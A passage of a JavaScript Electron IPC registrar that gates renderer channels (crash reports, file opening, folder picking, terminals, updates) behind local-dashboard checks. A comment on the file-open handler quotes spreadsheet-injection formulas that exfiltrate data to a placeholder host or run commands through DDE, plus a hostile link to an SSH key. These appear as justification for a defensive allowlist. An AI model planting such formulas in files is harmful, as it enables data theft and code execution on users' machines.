"use strict";

const { clampBadgeCount } = require("./badge");
const {
  isLocalGatewayEnabled,
  setLocalGatewayEnabled,
} = require("./local-gateway");
const {
  DEFAULT_GLOBAL_HOTKEY,
  createSummonHandler,
  bindGlobalHotkey: bindStoredGlobalHotkey,
  unregisterGlobalHotkey,
  currentGlobalHotkey,
  setGlobalHotkeyLogger,
} = require("./global-hotkey");
const { initAutoUpdate } = require("./auto-update");
const { requiredUpdateChannelFor } = require("./runtime/update/policy-channel");
const { makeUpdaterLogger } = require("./update-logger");
const { detectWsl2 } = require("./wsl-detection");
const { crashNoticeSummary } = require("./crash-collector");
const { PREFIX: PANE_ASSETS_PREFIX, purgeableOrigin } = require("./pane-asset-journal");
const { safeFilename } = require("./download-handler");

/**
 * Register the Electron shell's renderer bridges without taking ownership of
 * either window or gateway state. Electron is injected so this boundary can be
 * exercised with a small fake runtime rather than importing the main process.
 */
function createIpcRegistrar({
  electron,
  store,
  windows,
  gateway,
  backendUrl,
  port,
  detectWsl = detectWsl2,
  crashScan = null,
  glog,
  // Close/reopen the Crew Companion overlay around an update install so it does
  // not float orphaned over the vanished dashboard during the quit handoff.
  // Optional and no-op by default: an updater path must never depend on the
  // companion being wired.
  closeCrewCompanionForUpdate = () => {},
  reopenCrewCompanionAfterUpdate = () => {},
  // Shared single-use registry of downloads the renderer explicitly announced,
  // consumed by the will-download handler (see download-expectations.js). When
  // absent the download:expect channel is simply not registered.
  downloadExpectations = null,
  // The terminal-app allowlist and its grant-gated launcher. Injected so the
  // channel can be exercised without probing real install paths.
  externalTerminal = require("./external-terminal"),
  // The gateway's internal secret, re-read per call (it rotates per boot). Used
  // only to redeem an external-terminal grant at this shell's own gateway.
  readInternalSecret = () => "",
  fetchFn = (url, init) => fetch(url, init),
  // The update channel this build must follow, "" when Settings decides (an oss
  // build). See runtime/update/policy-channel.js.
  getRequiredChannel = requiredUpdateChannelFor(),
} = {}) {
  if (!electron) throw new Error("createIpcRegistrar: electron is required");
  if (!store) throw new Error("createIpcRegistrar: store is required");
  if (!windows) throw new Error("createIpcRegistrar: windows is required");
  if (!gateway) throw new Error("createIpcRegistrar: gateway is required");
  if (!backendUrl) throw new Error("createIpcRegistrar: backendUrl is required");
  if (!Number.isInteger(port)) throw new Error("createIpcRegistrar: port is required");
  if (typeof detectWsl !== "function") {
    throw new Error("createIpcRegistrar: detectWsl must be a function");
  }

  const {
    app,
    dialog,
    Notification,
    ipcMain,
    shell,
    webContents,
  } = electron;
  const log = typeof glog === "function" ? glog : (() => {});

  let shellRegistered = false;
  let updaterRegistered = false;
  let updater = null;
  // True when the gateway reports that a security policy provider owns this
  // install's updates and the Electron feed lane must stand down. Set by the
  // renderer via update:notify-policy-governed once the gateway status lands.
  let policyGoverned = false;
  // Set of webContents IDs currently reporting governance=true. Governance is
  // active as long as at least one sender is in the set; removing a sender's id
  // (on explicit false or on destroyed) clears governance only when the set
  // empties, so a second window closing does not re-enable the feed lane while
  // another window on the same bundled gateway is still governed.
  const governanceSenders = new Set();
  // Per-sender sequence counter to discard out-of-order async completions.
  // Two notifications from the same sender (e.g. false then true at startup)
  // are probed concurrently; if the probes complete in reverse order the
  // earlier continuation would overwrite the later verdict. Recording the
  // latest seq before awaiting and checking after guards this race condition.
  const senderSeq = new Map();
  // True while a native folder chooser is on screen, so a second request
  // answers "no choice" instead of stacking another dialog.
  let folderPickOpen = false;

  // Shared local-dashboard gate — used by both registerShell() and
  // registerUpdater() so the contract test finds a single spelling.
  // See the comment block inside registerShell() for the full rationale.
  const assertLocalDashboard = async (event, channel) => {
    let origin = "";
    try {
      origin = new URL(event.senderFrame.url).origin;
    } catch { /* about:blank, malformed URL, or torn-down frame */ }
    if (origin !== backendUrl) {
      log(`${channel} rejected for sender origin ${origin || "(unreadable)"}`);
      throw new Error(`${channel} is restricted to the local dashboard`);
    }
    const owner = windows.windowForWebContents(event.sender);
    if (!windows.security.isGatewayLocalForWindow(owner)) {
      log(`${channel} rejected for a sender window without a local gateway`);
      throw new Error(`${channel} is restricted to the local dashboard`);
    }
    const portOwner = await gateway.probePrimaryPortOwner();
    if (portOwner !== "kirocrew" && portOwner !== "service") {
      log(
        `${channel} rejected: :${port} held by ${portOwner}, `
        + "not this shell's gateway",
      );
      throw new Error(`${channel} is restricted to the local dashboard`);
    }
  };

  setGlobalHotkeyLogger(log);
  const summonDashboard = createSummonHandler({
    getWindow: () => (
      typeof windows.getSummonWindow === "function"
        ? windows.getSummonWindow()
        : (windows.focusedDashboardWindow() || windows.getMainWindow() || null)
    ),
    createWindow: () => windows.createMainWindow(),
    // A global shortcut fires while another app is frontmost. A fullscreen
    // tray-close hides the whole application, so unhide it before win.show();
    // then steal activation after the window has been surfaced.
    showApp: () => {
      if (process.platform === "darwin" && typeof app.show === "function") app.show();
    },
    focusApp: () => {
      if (process.platform === "darwin") app.focus({ steal: true });
    },
  });

  /**
   * Build the application menu, harden both Electron sessions, and register
   * every renderer bridge except update:*.
   *
   * This must run after app.whenReady() but before createMainWindow(): session
   * permission handlers need to exist before an untrusted view can be created.
   */
  function registerShell() {
    if (shellRegistered) return summonDashboard;

    // Session policy is window-owned because it knows which WebContents are
    // untrusted and which persistent partition hosts embedded browser pages.
    if (windows.security && typeof windows.security.configureSession === "function") {
      windows.security.configureSession();
    } else {
      // Transitional alias for callers composed against the flat façade name.
      windows.configureSessionSecurity();
    }

    // buildApplicationMenu also installs the resulting native Menu. Its click
    // callbacks stay inside the window façade, where focused-window resolution
    // and traffic-light/zoom reconciliation live.
    windows.menu.buildApplicationMenu();

    ipcMain.handle("app-menu:items", (event, id) =>
      windows.menu.items(event.sender, id));
    ipcMain.on("app-menu:execute", (event, id, index) =>
      windows.menu.execute(event.sender, id, index));
    ipcMain.on("dev-mode-changed", (_event, enabled) =>
      windows.menu.setDevMode(enabled));

    // The export path announces each download it is about to start ("expect one
    // download named <name>") so the will-download handler auto-saves ONLY
    // downloads the app explicitly asked for. The expectation is keyed by the
    // ANNOUNCING FRAME's own origin (event.sender), not a renderer-supplied
    // value, so one origin cannot pre-authorise another's download; the leaf
    // name is sanitised with the same safeFilename the handler uses so both
    // sides key on the same value.
    if (downloadExpectations && typeof downloadExpectations.register === "function") {
      ipcMain.on("download:expect", (event, filename) => {
        let origin = "";
        try {
          origin = new URL(event.sender.getURL()).origin;
        } catch {
          origin = "";
        }
        downloadExpectations.register({ origin, filename: safeFilename(filename) });
      });
    }

    // The shortcuts UI reports what is ACTUALLY bound. Registration may have
    // fallen back to the default or degraded to no shortcut at all.
    ipcMain.handle("global-hotkey:get", () => ({
      accelerator: currentGlobalHotkey(),
      default: DEFAULT_GLOBAL_HOTKEY,
    }));

    ipcMain.on("theme-accent-changed", (_event, hex) =>
      windows.chrome.setThemeAccent(hex));
    ipcMain.on("focus-mode-chrome", (event, visible) =>
      windows.chrome.focusMode(event.sender, visible));
    // Arm/disarm the off-window cursor poll that dismisses a focus-mode reveal.
    // A bare boolean: the window is the sender's, and the distance threshold is
    // the main process's, so the renderer names neither.
    ipcMain.on("focus-mode-watch-cursor", (event, watching) =>
      windows.chrome.watchFocusCursor(event.sender, watching));
    ipcMain.on("window-control", (event, action) =>
      windows.chrome.windowControl(event.sender, action, event.senderFrame));
    ipcMain.on("theme-mode-changed", (_event, pref) =>
      windows.chrome.setThemeMode(pref));
    ipcMain.on("titlebar-overlay-theme", (_event, mode) =>
      windows.chrome.setTitlebarMode(mode));

    // Electron no-ops setBadgeCount on unsupported platforms. Keep the clamp in
    // the trusted process so a malformed renderer value cannot set an absurd
    // badge on platforms which do support it.
    ipcMain.on("badge:set", (_event, count) => {
      app.setBadgeCount(clampBadgeCount(count));
    });

    // This setting deliberately has next-launch semantics. Toggling it never
    // starts or stops the gateway which owns the current session.
    ipcMain.handle("local-gateway:get", () => isLocalGatewayEnabled(store));
    ipcMain.handle("local-gateway:set", (_event, enabled) =>
      setLocalGatewayEnabled(store, enabled));

    // THE local-dashboard gate. Every channel whose answer is a fact about the
    // machine in front of the user — rather than about the gateway a window
    // happens to be talking to — takes all three of these, because a connection
    // window pointed at a REMOTE gateway shares this same preload.
    //
    // One function, not one copy per channel. `wsl:detect` and both
    // `crash-reports:*` channels need the identical three gates, and three
    // hand-maintained spellings of a security check are three chances for one of
    // them to be tightened while the others are not.
    //
    // All THREE gates, never two. An earlier version of this file stopped at
    // gate 2 for the crash channels, reasoning that gate 3 exists to withhold a
    // host software inventory and that this payload is only a count and a
    // timestamp. That reasoning does not survive `crash-reports:reveal`, which
    // is not a read at all: it opens a file-manager window on the machine in
    // front of the user. A manual SSH tunnel holding the primary port appears in
    // no remote-host config, so gate 2 passes for it by construction (see
    // `isGatewayLocalForWindow`, which can only consult configured hosts) — and
    // a remote renderer would then be able to pop a local Finder/Explorer
    // window and learn whether this machine has been crashing. Gate 3 is the
    // only one that positively identifies the listener.
    //
    // Every rejection is LOGGED, not silent. The UI renders a sender rejection
    // and a genuinely empty answer ("no crashes", "no WSL install") the same
    // way, so diagnostics are the only place those two causes can be told apart.
    // (assertLocalDashboard is defined at createIpcRegistrar scope, above.)

    // Crash artifacts left by a previous run, so the dashboard can say "this
    // happened" instead of leaving the user to discover it themselves.

    ipcMain.handle("crash-reports:get", async (event) => {
      await assertLocalDashboard(event, "crash-reports:get");
      // Absent injection means the shell was assembled without a collector —
      // report "nothing to see" rather than failing the renderer's first call.
      return crashNoticeSummary(typeof crashScan === "function" ? crashScan() : null);
    });

    // Reveal, never read. The renderer names no path and receives no path: this
    // resolves the log location in the trusted process from the scan it already
    // performed, so the channel cannot be turned into "open an arbitrary file
    // for me". Reveals the FILE (selected in its folder) rather than opening
    // it, because the useful gesture is "hand this directory over" — the log
    // sits beside chromium.log and the retained previous generation.
    ipcMain.handle("crash-reports:reveal", async (event) => {
      await assertLocalDashboard(event, "crash-reports:reveal");
      const scan = typeof crashScan === "function" ? crashScan() : null;
      if (!scan || !scan.crashLogPath) return { ok: false, error: "no crash log" };
      try {
        shell.showItemInFolder(scan.crashLogPath);
        return { ok: true };
      } catch (e) {
        log(`crash-reports:reveal failed: ${e && e.message}`);
        return { ok: false, error: String((e && e.message) || e) };
      }
    });

    // Purge the HTTP cache of ONE remote-crew pane origin. The renderer asks for
    // this when a pane's entry `<script type=module>` fires `error` (relayed as
    // `mc-embedded-boot stage=script-error`) and again on an explicit Retry:
    // a chunk 404 the gateway once served with `Cache-Control: immutable` is
    // replayed from this cache on every load, so no tunnel rebuild, re-mint or
    // gateway restart can ever get that pane past Loading -- only evicting the
    // entry can. Scope is the pane's ORIGIN and the `cache` data type only:
    // cookies, storage and the service worker are untouched, and the shell's
    // own origin is refused (see `purgeableOrigin`). Sender-gated like every
    // other channel that acts on this machine: the same preload serves a
    // connection window pointed at a REMOTE gateway, and only the local
    // dashboard shell -- the one that frames remote panes -- may evict a
    // loopback origin's cache; `purgeableOrigin` bounds WHICH origin, the gate
    // bounds WHO asks. After the gate, resolves to whether a purge ran and
    // never throws into the renderer: the reload that follows must go ahead
    // either way.
    ipcMain.handle("pane:clear-http-cache", async (event, origin) => {
      await assertLocalDashboard(event, "pane:clear-http-cache");
      const target = purgeableOrigin(origin, backendUrl);
      if (!target) {
        log(`${PANE_ASSETS_PREFIX} clear-http-cache refused origin=${String(origin).slice(0, 128)}`);
        return false;
      }
      const ses = event && event.sender && event.sender.session;
      if (!ses || typeof ses.clearData !== "function") {
        log(`${PANE_ASSETS_PREFIX} clear-http-cache unavailable origin=${target}`);
        return false;
      }
      try {
        await ses.clearData({ origins: [target], dataTypes: ["cache"] });
        log(`${PANE_ASSETS_PREFIX} clear-http-cache origin=${target} cleared`);
        return true;
      } catch (e) {
        log(`${PANE_ASSETS_PREFIX} clear-http-cache origin=${target} failed: ${e && e.message}`);
        return false;
      }
    });

    // WSL2 host-runtime readout, rendered read-only by the Host runtime card.
    // Sender-restricted ON PURPOSE: the discovery result is a fact about THIS
    // machine, so only WebContents served by this shell's own local gateway may
    // enumerate it. Connection windows pointed at a remote gateway share this
    // preload and must get a rejection instead of the host's distro inventory.
    ipcMain.handle("wsl:detect", async (event) => {
      await assertLocalDashboard(event, "wsl:detect");
      return detectWsl();
    });

    // What the main window's close button does. Deliberately narrower than
    // `assertLocalDashboard`, which would hide the row from a main window on a
    // configured remote host and leave that user no way to change it. The
    // sender must be the main window's top frame, still on its assigned
    // dashboard origin. That trusts the main window's dashboard, local or
    // remote, with a visible, reversible two-valued preference.
    const assertMainWindowDashboard = (event, channel) => {
      const refuse = (why) => {
        log(`${channel} rejected: ${why}`);
        throw new Error(`${channel} is restricted to the main window's dashboard`);
      };
      const main = windows.getMainWindow();
      if (!main || windows.windowForWebContents(event.sender) !== main) {
        refuse("sender is not the main window");
      }
      if (!event.senderFrame || event.senderFrame !== event.sender.mainFrame) {
        refuse("sender is not the top frame");
      }
      let origin = "";
      let expected = "";
      try {
        origin = new URL(event.senderFrame.url).origin;
        expected = new URL(main._mcBackendUrl).origin;
      } catch {
        // An unreadable URL matches nothing.
      }
      if (!origin || origin !== expected) {
        refuse(`sender origin ${origin || "(unreadable)"} is not the main window's dashboard`);
      }
    };
    ipcMain.handle("close-action:get", async (event) => {
      assertMainWindowDashboard(event, "close-action:get");
      return windows.closeAction.get();
    });
    ipcMain.handle("close-action:set", async (event, value) => {
      assertMainWindowDashboard(event, "close-action:set");
      return windows.closeAction.set(value);
    });

    // Open a file the chat referenced in the user's own editor, by handing its
    // path to the OS default handler on the machine in front of them.
    //
    // Sibling to `crash-reports:reveal`, and gated the same way: this is not a
    // read, it is a LAUNCH on the local machine, so it takes the full
    // three-gate local-dashboard check. A connection window pointed at a REMOTE
    // gateway shares this preload, and must never be able to open a file on the
    // host running this shell.
    //
    // Trust nothing about the path either: the chat transcript is AGENT-authored
    // (and can carry externally-influenced content), so a hostile
    // `[open](/Users/me/.ssh/id_rsa)` must not become "launch this". Hence the
    // same validation shape the `mochi-pet:open-image` handler already uses:
    //   - realpathSync BEFORE the extension test, so a `.md` symlink to a key
    //     file is judged by what it actually resolves to;
    //   - a text/document extension allowlist — a fixed set, deliberately not
    //     user-extensible (a configurable list reopens the external-scheme
    //     surface external-scheme.js documents as rejected);
    //   - a regular-file requirement;
    //   - a non-empty `openPath` return means the OS refused; surface it rather
    //     than failing silently.
    // The chip that reaches this channel is only actionable after the gateway's
    // own /api/file-read probe has already confirmed a non-sensitive regular
    // file (is_sensitive_path), so the credential-path denylist is enforced
    // upstream; the checks here are defence in depth on the launch primitive.
    ipcMain.handle("dashboard:open-file", async (event, filePath) => {
      await assertLocalDashboard(event, "dashboard:open-file");
      if (typeof filePath !== "string" || filePath === "") {
        return { ok: false, error: "no path" };
      }
      const fs = require("fs");
      const nodePath = require("path");
      const { openPathHardened } = require("./open-path");
      // ONLY extensions whose OS default handler opens the file in a
      // PLAIN-TEXT viewer/editor and CANNOT execute the file's contents. That
      // predicate -- not a hand-kept list -- is the security bar: shell.openPath
      // launches the OS default handler and the path is agent-authored, so any
      // type whose handler can run embedded content is arbitrary code execution.
      // Four families are therefore excluded, all reachable only through this
      // affordance (the built-in viewer, which renders inert, remains for them):
      //   - interpreter/shell scripts (`.js`/`.mjs`/`.cjs` -> Windows Script Host,
      //     `.py`/`.rb` -> interpreters, `.sh`/`.ps1` -> a shell);
      //   - browser ACTIVE DOCUMENTS (`.html`/`.htm`/`.svg`/`.xml`) -- the browser
      //     opens them at a `file://` origin and EXECUTES embedded JavaScript;
      //   - RICH DOCUMENTS whose default app has a content-execution surface
      //     (`.doc`/`.docx`/`.odt` -> Word/LibreOffice VBA/macros incl. AutoOpen,
      //     `.rtf` -> Word OLE, `.pdf` -> reader JavaScript). Legacy `.doc` is the
      //     clearest case (VBA/AutoOpen), but the whole family fails the predicate;
      //     and
      //   - SPREADSHEETS (`.csv`/`.tsv`/`.xls`/`.xlsx`/`.ods`). These LOOK like
      //     plain text, and that is the trap: the extension decides the app, and
      //     the default app for them is Excel / Numbers / LibreOffice Calc, which
      //     EVALUATES any cell opening with `=`, `+`, `-` or `@` as a formula. An
      //     agent-authored `=WEBSERVICE("http://host/"&A1)` exfiltrates the sheet
      //     and `=cmd|'/c ...'!A0` reaches DDE, so the bytes are executed by the
      //     handler even though nothing about the file is a program. Judge the
      //     predicate on the app that actually opens the type, not on how the
      //     bytes read to a human.
      const OPENABLE_EXTS = new Set([
        ".md", ".markdown", ".txt", ".text", ".rst", ".org", ".log",
        ".json", ".jsonc", ".json5", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf", ".env",
        ".css", ".graphql", ".proto",
      ]);
      try {
        // realpath BEFORE the extension test: a `.md` symlink to a key file
        // must be judged by what it actually resolves to.
        const real = fs.realpathSync(filePath);
        if (!OPENABLE_EXTS.has(nodePath.extname(real).toLowerCase())) {
          return { ok: false, error: "unsupported file type" };
        }
        if (!fs.statSync(real).isFile()) {
          return { ok: false, error: "not a file" };
        }
        // Hand the launch to the hardened wrapper, not `shell.openPath`: on
        // Linux the bare `xdg-open` name resolves against the inherited PATH,
        // so an agent-writable leading entry would shadow the launcher and turn
        // an open into arbitrary code execution. `openPathHardened` narrows PATH
        // across the native launch and is a drop-in (same `Promise<string>`,
        // empty on success) -- it hardens WHICH launcher runs, while the
        // realpath/extension/isFile checks above decide WHAT it may open.
        // Non-empty return value means the OS refused to open it.
        const err = await openPathHardened(shell, real);
        if (err) {
          log(`dashboard:open-file: OS refused ${real}: ${err}`);
          return { ok: false, error: err };
        }
        return { ok: true };
      } catch (e) {
        log(`dashboard:open-file refused: ${e && e.message}`);
        return { ok: false, error: String((e && e.message) || e) };
      }
    });

    // The OS-native folder chooser behind the project picker's "Open system
    // folder picker" button. Electron's own dialog draws it from this process,
    // so it spawns nothing and needs no sandbox allowance.
    //
    // Gated like `crash-reports:reveal`: a dialog is an action on the machine in
    // front of the user, and the folder it returns is a path on THIS machine, so
    // it is only meaningful to a window whose gateway runs here. A connection
    // window pointed at a remote gateway shares this preload and is refused.
    //
    // The renderer supplies nothing. The handler reads only the event: the
    // options are fixed here, so a page cannot choose the default path, the
    // properties (files, multi-select) or the filters. The answer is the one
    // absolute folder the user chose, or null for a cancel or a malformed
    // result; a dialog that fails to open rejects, so the picker can tell the
    // user instead of reading it as a cancel. The picker validates the path
    // through the gateway's directory listing before using it. The chosen path
    // is never logged.
    ipcMain.handle("dashboard:pick-folder", async (event) => {
      await assertLocalDashboard(event, "dashboard:pick-folder");
      if (folderPickOpen) return null;
      folderPickOpen = true;
      try {
        const owner = windows.windowForWebContents(event.sender);
        const parent = owner && !(typeof owner.isDestroyed === "function" && owner.isDestroyed())
          ? owner
          : null;
        const options = { properties: ["openDirectory"] };
        let result;
        try {
          result = parent
            ? await dialog.showOpenDialog(parent, options)
            : await dialog.showOpenDialog(options);
        } catch (e) {
          log(`dashboard:pick-folder failed: ${e && e.message}`);
          throw new Error("dashboard:pick-folder could not open the folder dialog");
        }
        if (!result || result.canceled || !Array.isArray(result.filePaths)) return null;
        const picked = result.filePaths[0];
        if (typeof picked !== "string" || !require("path").isAbsolute(picked)) return null;
        return picked;
      } finally {
        folderPickOpen = false;
      }
    });

    // Whether this window may use `dashboard:pick-folder`, so the picker shows
    // the button only where it works. Runs the same gate and answers a bare
    // boolean -- the same fact a gated channel's rejection already tells -- and
    // never opens a dialog.
    ipcMain.handle("dashboard:can-pick-folder", async (event) => {
      try {
        await assertLocalDashboard(event, "dashboard:can-pick-folder");
        return true;
      } catch {
        return false;
      }
    });

    // Open the user's own terminal app in a project directory. Gated like
    // `dashboard:open-file` because it is a LAUNCH on the machine in front of
    // the user, and a connection window pointed at a remote gateway shares this
    // preload.
    //
    // `detect` lists the allowlisted apps installed here, for the Settings
    // picker; the pick itself is gateway config. `open` takes the opaque grant
    // the gateway minted after its own checks (owner, direct-local request,
    // integrated terminal enabled, an app picked) and starts nothing unless the
    // gateway redeems it. The app id and the directory come from that
    // redemption, the binary and argv from the allowlist in
    // external-terminal.js, and no OS opener is involved at any step.
    //
    // `detect` answers a refused window `{ apps: [], capable: false }` instead
    // of rejecting, as `dashboard:can-pick-folder` answers false: a desktop
    // window reaching a remote crew through an SSH tunnel is an ordinary
    // window that can never launch here, not a failed check, so the renderer
    // hides the row and the picker rather than reporting an error a Retry
    // cannot clear. The gate still runs (and logs) before any probe, so a
    // refused window learns only this one bit, and `open` keeps rejecting.
    ipcMain.handle("external-terminal:detect", async (event) => {
      try {
        await assertLocalDashboard(event, "external-terminal:detect");
      } catch {
        return { apps: [], capable: false };
      }
      return { apps: externalTerminal.detectTerminals(), capable: true };
    });
    ipcMain.handle("external-terminal:open", async (event, grant) => {
      await assertLocalDashboard(event, "external-terminal:open");
      return externalTerminal.launchFromGrant(grant, {
        backendUrl,
        getSecret: () => readInternalSecret(backendUrl),
        fetchFn,
        log,
      });
    });

    ipcMain.handle("zoom:get", (event) =>
      windows.chrome.getZoom(event.sender));
    ipcMain.handle("zoom:set", (event, factor) =>
      windows.chrome.setZoom(event.sender, factor));
    ipcMain.handle("zoom:step", (event, direction) =>
      windows.chrome.stepZoom(event.sender, direction));

    // The window façade resolves every request from event.sender and keeps the
    // native panel/control-plane internals private to that owning window.
    ipcMain.handle("browser:open", (event, panelId, url) =>
      windows.browser.open(event.sender, panelId, url));
    ipcMain.handle("browser:navigate", (event, panelId, url) =>
      windows.browser.navigate(event.sender, panelId, url));
    ipcMain.handle("browser:set-bounds", (event, panelId, rect, viewport) =>
      windows.browser.setBounds(event.sender, panelId, rect, viewport));
    ipcMain.handle("browser:set-overlay", (event, panelId, active) =>
      windows.browser.setOverlay(event.sender, panelId, active));
    ipcMain.handle("browser:set-inactive", (event, panelId, value) =>
      windows.browser.setInactive(event.sender, panelId, value));
    ipcMain.handle("browser:close", (event, panelId) =>
      windows.browser.close(event.sender, panelId));
    ipcMain.handle("browser:get-state", (event, panelId) =>
      windows.browser.getState(event.sender, panelId));
    ipcMain.handle("browser:track-session", (event, panelId, tracked) =>
      windows.browser.trackSession(event.sender, panelId, tracked));
    ipcMain.handle("browser:set-agent-act", (event, panelId, enabled) =>
      windows.browser.setAgentAct(event.sender, panelId, enabled));
    ipcMain.handle("browser:set-control-owner", (event, panelId, requested) =>
      windows.browser.setControlOwner(event.sender, panelId, requested));
    ipcMain.handle("browser:get-control", (event, panelId) =>
      windows.browser.getControl(event.sender, panelId));
    // Deliberately remains a closed verb dispatcher inside window-lifecycle;
    // this bridge never exposes a raw CDP method to the renderer.
    ipcMain.handle("browser:control", (event, panelId, op, args) =>
      windows.browser.control(event.sender, panelId, op, args));
    // Element annotation on the native page (human-initiated; closed op set,
    // not a control op -- it takes no agent ownership of the view).
    ipcMain.handle("browser:annotate", (event, panelId, op, args) =>
      windows.browser.annotate(event.sender, panelId, op, args));

    ipcMain.on("mic:denied", () => windows.security.micDenied());

    // Diagnostics accept only the sender identity and payload. The window
    // owner enforces the primary-renderer attribution rule before buffering.
    ipcMain.on("memory-sample", (event, payload) =>
      windows.diagnostics.memorySample(event.sender, payload));

    shellRegistered = true;
    return summonDashboard;
  }

  /**
   * Bind only after createMainWindow(). Binding earlier lets a keypress during
   * boot race window creation and produce a second dashboard.
   */
  function bindGlobalHotkey() {
    return bindStoredGlobalHotkey(store.get("globalHotkey"), summonDashboard);
  }

  function broadcastUpdateState(payload) {
    // Include the main-process governance verdict in every state update so
    // the renderer can distinguish a local bundled gateway (governed) from
    // a remote one connected via SSH (not governed here, regardless of stamp).
    const enriched = { ...payload, policyGoverned };
    try {
      for (const contents of webContents.getAllWebContents()) {
        if (!contents.isDestroyed()) {
          try {
            contents.send("update-state", enriched);
          } catch {
            // The view disappeared between enumeration and dispatch.
          }
        }
      }
    } catch {
      // Updating is auxiliary; an unavailable WebContents registry is benign.
    }
  }

  /**
   * Initialize auto-update and register update:* IPC.
   *
   * Call this after the main window exists but BEFORE awaiting gateway.start()
   * or gateway.connect(). preload exposes updateAPI immediately, so a slow or
   * failed boot must not leave a visible button with no IPC handler behind it.
   */
  function registerUpdater() {
    if (updaterRegistered) return updater;

    // FAIL-OPEN: updater initialization is auxiliary and must never gate the
    // gateway. Because this runs before the awaited boot, any thrown require,
    // feed parse, or updater construction error is converted to a disabled
    // handle; all update:* handlers still register against that handle.
    try {
      updater = initAutoUpdate({
        app,
        // electron-updater's AppUpdater, NOT Electron's built-in autoUpdater:
        // it generates/verifies feed metadata and also supports Linux.
        autoUpdater: require("electron-updater").autoUpdater,
        isPolicyGoverned: () => policyGoverned,
        dialog: electron.dialog,
        Notification,
        getFlavor: () => "stable",
        getChannelPreference: () => store.get("updateChannel", ""),
        getRequiredChannel,
        getAutoDownloadPreference: () =>
          store.get("autoDownloadUpdates", true) !== false,
        notifyUpdateFound: (version, { autoDownload = false } = {}) => {
          if (!version || store.get("lastNudgedVersion", "") === version) return;
          store.set("lastNudgedVersion", version);
          try {
            const notification = new Notification({
              title: `${app.name} update available`,
              body: autoDownload
                ? `Version ${version} is downloading and will install the next time you quit. `
                  + "Manage in Settings > About."
                : `Version ${version} is ready. Open Settings > About to download and install.`,
            });
            notification.on("click", () => {
              // Reveal through the façade so a pending fullscreen/tray hide is
              // cancelled before restore/show/focus; otherwise the click can
              // appear to work and then immediately hide the window again.
              windows.showMainWindow({ focus: true });
            });
            notification.show();
          } catch {
            // Native notifications are optional; discovery still succeeds.
          }
        },
        stopGateway: () => gateway.stopForUpdate(),
        // WHY this hook precedes stopGateway: it closes the watchdog race before
        // the intentional shutdown and disarms probing throughout bundle swap.
        // auto-update invokes onInstallDispatched before awaiting stopGateway;
        // keep these as separate callbacks so that ordering remains explicit.
        // Closing the companion overlay here — before the gateway stops — keeps a
        // reconcile tick from reopening it in the window where it is still up.
        onInstallDispatched: () => {
          gateway.onInstallDispatched();
          closeCrewCompanionForUpdate();
        },
        // WHY failure recovery is active: dispatch stopped both the watchdog and
        // gateway. A failed swap does not quit, so nothing else can restore the
        // dashboard; the supervisor clears the flag, respawns, reconnects, and
        // re-arms liveness in that order. The companion closed at dispatch is
        // reopened to match — its loop self-heals once the restored gateway answers.
        onInstallFailed: () => {
          gateway.onInstallFailed();
          reopenCrewCompanionAfterUpdate();
        },
        onUpdateState: broadcastUpdateState,
        log: makeUpdaterLogger(log),
      });
    } catch (error) {
      log(
        "auto-update init failed — continuing WITHOUT auto-update: "
        + ((error && error.stack) || error),
      );
      updater = {
        check: () => {},
        download: async () => {},
        install: async () => {},
        getInfo: () => ({
          version: app.getVersion(),
          packaged: !!app.isPackaged,
        }),
        disabled: "init-failed",
      };
    }

    // disabled is a sibling on every updater handle, not part of getInfo().
    // Merge it once so Settings > About can render why updates are unavailable.
    const updaterInfo = () => ({
      ...updater.getInfo(),
      disabled: updater.disabled,
      policyGoverned,
    });

    // One-way notification from the renderer: the gateway status reported that
    // a security policy provider governs this install's updates. The feed lane
    // stands down until notified the opposite. Fire-and-forget: no response
    // expected; the lane reads policyGoverned on its next scheduled check.
    //
    // Three-gate guard (assertLocalDashboard): origin, window-locality, and
    // port-owner proof. The `lsof` binary is required on Linux for gate 3;
    // it is declared as a Debian package dependency in electron/package.json.
    ipcMain.on("update:notify-policy-governed", async (_event, governed) => {
      const srcId = _event?.sender?.id ?? null;
      // Per-sender sequence: bump before awaiting so if a later notification
      // from the same sender completes the probe first, this older continuation
      // is discarded and does not overwrite the newer verdict.
      const mySeq = (senderSeq.get(srcId) ?? 0) + 1;
      senderSeq.set(srcId, mySeq);

      // Three-gate check via the shared assertLocalDashboard helper.
      try {
        await assertLocalDashboard(_event, "update:notify-policy-governed");
      } catch {
        return;
      }
      // Gate 4 — current-bundle ownership (governance handler only).
      // A second copy of the app can also hold the port as "kirocrew"; its
      // policy provider would incorrectly suppress this copy's updater.
      // Unlike assertLocalDashboard's three gates which apply to every shell
      // channel, this check is only relevant for governance, and
      // isCurrentBundleGateway returns false on Windows/dev so must not
      // run for other channels. Skip when the function is unavailable.
      if (typeof gateway.isCurrentBundleGateway === "function") {
        let isCurrentBundle = false;
        try {
          isCurrentBundle = await gateway.isCurrentBundleGateway();
        } catch { /* probe failed — fail closed */ }
        if (!isCurrentBundle) {
          log("update:notify-policy-governed ignored: running gateway belongs to a different bundle");
          return;
        }
      }
      // Reject senders that were destroyed while the probe was awaited.
      // If the window closed during assertLocalDashboard's async port probe,
      // the srcId must not be added to governanceSenders: the destroyed event
      // already fired before the add, so no cleanup listener will fire.
      if (_event?.sender?.isDestroyed?.()) {
        log("update:notify-policy-governed: sender destroyed during probe — rejecting");
        return;
      }
      // Discard if a newer notification from the same sender already landed.
      if (senderSeq.get(srcId) !== mySeq) {
        log("update:notify-policy-governed: superseded notification discarded");
        return;
      }
      const prev = policyGoverned;
      if (governed) {
        if (srcId !== null) {
          governanceSenders.add(srcId);
          // Remove from the set when the window is destroyed so governance is
          // lifted automatically once all governing windows close.
          // Uses the captured srcId (not a live sender reference) because the
          // sender object is gone by the time destroyed fires.
          if (_event?.sender) {
            _event.sender.once("destroyed", () => {
              governanceSenders.delete(srcId);
              // On macOS the app stays alive after all windows close
              // (Cmd+W vs Cmd+Q). If this was the last window, do not clear
              // governance: the user may reopen a window and the governance
              // state re-sent by the new window's hook will re-establish it.
              // On other platforms the app exits when the last window closes,
              // so clearing is safe. Only clear when another window is open
              // or we're not on macOS.
              const { BrowserWindow } = electron;
              const anyOpen = BrowserWindow && BrowserWindow.getAllWindows().length > 0;
              if (anyOpen || process.platform !== "darwin") {
                const wasGoverned = policyGoverned;
                policyGoverned = governanceSenders.size > 0;
                // Broadcast the cleared verdict to any remaining windows so
                // their useIsPolicyGoverned can stop treating the old
                // update-state cache value as authoritative (same as the
                // explicit-false path).
                if (wasGoverned && !policyGoverned) {
                  updater?.check?.();
                }
              }
            });
          }
        }
